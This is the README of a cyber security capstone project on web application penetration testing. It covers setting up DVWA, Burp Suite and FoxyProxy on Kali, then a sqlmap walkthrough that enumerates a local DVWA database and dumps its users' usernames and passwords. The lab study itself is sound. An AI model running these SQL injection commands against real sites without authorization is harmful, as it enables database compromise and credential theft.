# Project Topic
Web Application Penetration Testing (Research)

# Capstone Project Description:

This capstone project focuses on the research and practical application of Web Application Penetration Testing (WAPT) to evaluate and enhance the security posture of modern web applications. The objective is to explore and demonstrate the methodologies, tools, and techniques used to identify, exploit, and mitigate vulnerabilities in web-based systems.

The project involves conducting a comprehensive security assessment of a simulated or real-world web application using industry-standard tools such as Burp Suite, OWASP ZAP, Nikto, and Nmap. It follows a structured penetration testing methodology based on the OWASP Testing Guide and PTES (Penetration Testing Execution Standard).

The research component investigates common vulnerabilities like:

    SQL Injection (SQLi)

    Cross-Site Scripting (XSS)

    Cross-Site Request Forgery (CSRF)

    Broken Authentication

    Security Misconfigurations

    Insecure Deserialization
## Getting Started
# Installation:
🔧 Setting Up Burp Suite & DVWA:
Using DVWA in Kali Linux

Kali usually comes with Apache and MySQL:

    Install DVWA

sudo apt update
sudo apt install apache2 mariadb-server php php-mysqli git
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa

Configure Database

sudo mysql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwapassword';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

Edit config.inc.php
Set MySQL credentials as above.

Start Services

    sudo systemctl start apache2
    sudo systemctl start mariadb

    Open in Browser:

        http://localhost/dvwa/

3. Setting Up Burp Suite
Install Burp Suite

    Community Edition is free and available at:
    https://portswigger.net/burp/communitydownload

Configure Burp Proxy

    Launch Burp Suite

    Go to Proxy > Options

    Note the Proxy Listener (default is 127.0.0.1:8080)

Configure Browser to Use Burp Proxy

    In Firefox:

        Settings > Network Settings > Manual Proxy Configuration:

            HTTP Proxy: 127.0.0.1, Port: 8080

            Check "Use this proxy for all protocols"

    Import Burp CA Certificate:

        Visit http://burp in the browser.

        Download CA Certificate.

        Import it under Privacy & Security > Certificates

  🛠️ Proxy Configuration Using FoxyProxy for Burp Suite
  
✅ Step 1: Install FoxyProxy Extension in Firefox

    Open Firefox.

    Go to the FoxyProxy Add-on page

    Click "Add to Firefox" and install the extension.

    Once installed, you’ll see the FoxyProxy icon (a fox) in the toolbar.

✅ Step 2: Start Burp Suite and Check Proxy Listener

    Launch Burp Suite.

    Go to Proxy > Options > Proxy Listeners.

    Ensure that there is a listener running on 127.0.0.1:8080 (default). If not, click Add and configure it:

        Bind to address: 127.0.0.1

        Port: 8080

        Click OK

✅ Step 3: Configure FoxyProxy with Burp Details

    Click the FoxyProxy icon in Firefox and select "Options".

    Click "Add New Proxy".

Fill in the proxy settings:

    Proxy Type: HTTP

    Proxy IP Address: 127.0.0.1

    Port: 8080

    Give it a name like "Burp Suite Proxy"

Optional: Add a pattern to only use this proxy for localhost or DVWA URLs

Under "URL Patterns", you can define:

    Pattern: *localhost* or *127.0.0.1*

    Click Save.

✅ Step 4: Enable Burp Proxy via FoxyProxy

    Click the FoxyProxy icon again.

    Select "Burp Suite Proxy" from the dropdown to activate it.

Now, all your browser traffic will be routed through Burp Suite, and you can view it in Proxy > HTTP History.
✅ Step 5: Test the Setup

    Open a new tab and go to http://localhost/dvwa/

    In Burp Suite, under Proxy > Intercept, turn Intercept is on.

    You should see the HTTP request appear in Burp.

    You can forward, drop, or modify it as needed.

🛡️ Final Note: Install Burp’s CA Certificate

To avoid SSL warnings on HTTPS sites:

    Go to http://burp in Firefox (while proxy is active).

    Download and install the Burp CA certificate.

    In Firefox:

        Settings > Privacy & Security > Certificates > View Certificates

        Import the .cer file

        Trust it for identifying websites
🔧 Setting Up and Using SQLMap
✅ 1. What is sqlmap?

sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection (SQLi) flaws and taking over database servers.
✅ 2. Installation
🐧 On Kali Linux (pre-installed):

sqlmap --version

If not installed:

sudo apt update
sudo apt install sqlmap

💻 On Ubuntu/Debian/Linux:

sudo apt update
sudo apt install sqlmap

🪟 On Windows:

    Install Python from python.org

    Download sqlmap:

        https://github.com/sqlmapproject/sqlmap

    Extract and run:

cd sqlmap
python sqlmap.py --help

✅ 3. Target Setup: Use DVWA in Low Security Mode

    Go to http://localhost/dvwa/

    Login (default: admin / password)

    Set Security Level to Low under DVWA Security.

✅ 4. Run Basic SQLMap Test
⚠️ Get a Vulnerable URL from DVWA:

Go to SQL Injection module in DVWA. You’ll see a URL like:

http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

Copy that full URL with parameters.
✅ 5. Using SQLMap from Command Line

Basic syntax:

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id"

🔍 To Get Your PHPSESSID Cookie:

    In Firefox, press F12 > Storage > Cookies > localhost

    Copy the PHPSESSID value and include it in the --cookie flag.

✅ 6. Useful SQLMap Options

    --dbs → List available databases

    -D database_name --tables → List tables in a database

    -D db_name -T table_name --columns → Show columns in a table

    --dump → Dump data

    --risk=3 --level=5 → Test more thoroughly

Example:

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abcd1234" --dbs

✅ 7. Automate and Export Results

Save output to file:

sqlmap -u "..." --cookie="..." --dbs --batch --output-dir=output/

✅ 8. Safety and Ethics Reminder

Only use sqlmap on applications you own or have explicit permission to test. Unauthorized scanning is illegal and unethical.

## ScreenShorts
# FoxyProxy extension from the Firefox add-ons store.
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/froxy%20proxy.png?raw=true">
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap.png?raw=true">
# Cookie harvesting.
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/DVWA.png?raw=true">
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/Burbsuite.png?raw=true">
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/DVWA-2.png?raw=true">
# Scanning for vulnerabilities.
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-1.png?raw=true">
<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-2.png?raw=true">
# Revealing the database schemas.
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --schema --batch   

<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-3.png?raw=true">
# Revealing the dvwa tables.
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" -D dvwa --tables  

<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-4.png?raw=true">
# Enumerate the “users” table.
qlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --columns -T users --batch  

<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/enumeraion%20table.png?raw=true">
# Dump Usernames and Passwords.
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --dump -T users --batch

<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/Dumps%20user%20name%20and%20Password.png?raw=true">





